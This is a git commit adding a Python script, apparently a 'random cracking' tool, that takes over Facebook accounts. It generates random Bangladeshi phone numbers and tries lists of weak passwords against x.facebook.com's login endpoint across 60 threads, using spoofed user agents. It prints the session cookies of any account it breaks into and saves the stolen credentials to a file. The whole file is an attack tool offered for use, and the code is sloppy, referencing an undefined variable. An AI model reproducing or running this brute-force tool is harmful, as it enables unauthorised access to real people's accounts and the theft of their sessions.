dafc30c8f6164dd7e9e772864838bd1aa5f7a617
SinglePro <139615549+SinglePro@users.noreply.github.com>
2023-07-15 14:06:28 +0600

    Add files via upload

---
+++ END-1.py
@@ -0,0 +1,268 @@
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os
+import random
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+from requests.exceptions import ConnectionError
+import string
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('git pull')
+    os.system('pkg install curl')
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+R = '\033[31;1m'
+RED = '\x1b[38;5;46m'
+G = '\033[32;1m'
+Y = '\033[33;1m'
+B = '\033[34;1m'
+M = '\033[35;1m'
+C = '\033[36;1m'
+R = '{RED}' 
+LR = '\033[91;1m'
+LG = '\033[92;1m'
+LY = '\033[93;1m'
+LB = '\033[94;1m'
+LM = '\033[95;1m'
+LC = '\033[96;1m'
+dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://mbasic.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+ugen=[]
+uas=[]
+usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+rr = random.randint
+for xd in range(3005):
+    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
+    uas.append(ff)
+for sat in range(1000):
+	a='NokiaX'
+	b=random.randrange(1,9)
+	c='-0'
+	d=random.randrange(1,9)
+	e='/'
+	f=random.randrange(1,9)
+	g='.0 ('
+	h=random.randrange(1,12)
+	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+	j='UNTRUSTED/'
+	k=random.randrange(1,3)
+	l='.0'
+	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+	ugen.append(uaku2)
+
+nka = [
+"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
+"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
+"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
+]
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+  
+logo=("""\033[1;37m
+\033[1;96m █████ \033[0;92m ██ \033[0;91m      ██████ \033[1;96m ███    ██ \033[0;92m███████ 
+\033[1;96m██   ██\033[0;92m ██   \033[0;91m   ██    ██ \033[1;96m████   ██ \033[0;92m██      
+\033[1;96m███████ \033[0;92m██ \033[0;91m     ██    ██ \033[1;96m██ ██  ██ \033[0;92m█████   
+\033[1;96m██   ██ \033[0;92m██    \033[0;91m  ██    ██ \033[1;96m██  ██ ██ \033[0;92m██      
+\033[1;96m██   ██ \033[0;92m███████\033[0;91m  ██████ \033[1;96m ██   ████ \033[0;92m███████              
+\033[1;97m┏━━\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━\033[0;91m\033[1;97m━━┓\033[1;97m
+\033[1;97m┃\033[1;96m DEVOLPER :\033[1;33m ZERO X BOY         \033[1;97m┃\033[1;96m FREE TOOL   \033[1;97m┃\033[1;97m
+\033[1;97m┃\033[1;35m FACEBOOK :\033[1;32m ZERO BOY           \033[1;97m┣━━━━━━━━━━━━━┫\033[1;97m
+\033[1;97m┃\033[1;34m GITHUB   :\033[1;97m ZERO-243          \033[1;97m ┃\033[1;32mVERSION :\033[1;97m1.0 \033[1;97m┃\033[1;97m
+\033[1;97m┃\033[1;32m WHATSAPP :\033[1;33m +8801*********    \033[1;97m ┃\033[1;33m BANGLADESH  \033[1;97m┃\033[1;97m
+\033[1;97m┗━━\033[0;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━\033[0;91m\033[1;97m━━┛\033[1;97m""")
+def Main():
+	os.system('clear')
+	print(logo)
+	print("\033[1;32m[\033[1;97mA\33[1;92m] START RANDOM CRACKING")
+	print("[\033[1;97mB\33[1;92m] MAIN ADMIN FB ACCOUNT")
+	print("[\033[1;97mC\33[1;92m] JOIN MESSAGER GROUP")
+	print('[\033[1;97mD\33[1;92m] EXIT PROGRAMMING')
+	opt = input('[+] SELECT :')
+	if opt in ["A","1"]:
+		virusA()
+	if opt in ["B","2"]:
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100052901881371');time.sleep(1)
+		fb()
+	if opt in ["C","3"]:
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100052901881371');time.sleep(1)
+		group()
+	if opt in ["D","0"]:
+		exit()
+	else:
+		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
+		Main()
+def admin():
+	os.system('clear')
+	print(logo)
+	print(48*'━')
+	print(' [1] Contract WhatsApp ')
+	print(' [2] JOIN MY FB GROUP ')
+	print(' [3] FOLLOW MY GITHUB ')
+	print(' [0] Back to Main menu')
+	bal = input('[+] SELECT :')
+	if bal =='1':
+		os.system('xdg-open https://wa.me/+8801960940461');time.sleep(1)
+		admin()
+	if bal =='2':
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100052901881371');time.sleep(1)
+		admin()
+	if bal =='3':
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100052901881371');time.sleep(1)
+		admin()
+	if bal =='0':
+		Main()
+		
+def virusA():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" \033[0;92m┏━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m BD SIM CODE : \033[1;91m017 015 018 019")
+	kode = input(' \033[0;92m┗━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m SELECT      :\033[1;91m ')
+	doamin = ' BD Number id cloner [ONLY-OK] '
+	print(' \033[0;92m┏━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m EXAMPLE     :\033[1;91m 1000 5000 10000')
+	limit = int(input(' \033[0;92m┗━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m LIMIT       :\033[1;91m '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('\033[0;92m┏━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m TOTAL ID   :\033[1;97m  '+tl)
+		print(f'\033[0;92m┣━[\033[1;91m+\033[0;92m]\033[0;92m SIM CODE   : \033[1;97m {kode} ')
+		print('\033[0;92m┗━[\033[1;91m+\033[0;92m]\033[0;92m IF NO RESULT \033[1;33m[ON/OFF\033[1;33m]\033[1;33m \033[0;92mAIRPLANE  MODE')
+		print(44*'━')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','09876543']
+			yaari.submit(b,uid,pwx,tl)
+	print(44*'━')
+	print(' [💉] Crack process has been completed')
+	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(44*'━')
+	exit()
+
+def b(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[0;92mFINDING\033[1;91m]\033[1;97m<>\033[1;91m[\033[1;33m%s/%s\033[1;91m]\033[1;97m\033[1;97m<>\033[1;91m[\033[0;92mALIVE:%s\033[1;91m]\033[1;91m '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://x.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'x.facebook.com',
+           'method': 'GET',
+           'path': '/login/device-based/login/async/',
+           'scheme': 'https',
+            'authority': 'x.facebook.com',
+    		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  		  'accept-language': 'en-US,en;q=0.9',
+ 		   'cache-control': 'max-age=0',
+ 		   'referer': 'https://x.facebook.com/bookmarks/',
+ 		   'sec-ch-prefers-color-scheme': 'light',
+ 		   'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+  		  'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+  		  'sec-ch-ua-mobile': '?1',
+  		  'sec-ch-ua-platform': '"Android"',
+  		  'sec-ch-ua-platform-version': '"11.0.0"',
+ 		   'sec-fetch-dest': 'document',
+ 		   'sec-fetch-mode': 'navigate',
+  		  'sec-fetch-site': 'same-origin',
+  		  'sec-fetch-user': '?1',
+  		  'upgrade-insecure-requests': '1',
+  		  'user-agent': ua}
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid=coki[151:166]
+                print(f'\r\033[1;91m [\033[0;92mALIVE\033[1;91m]\033[0;92m '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;36m=[🤍]=COOKIE : '+coki)
+                oks.append(cid)
+                open('/sdcard/ALIVE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+
+        pass
+Main()
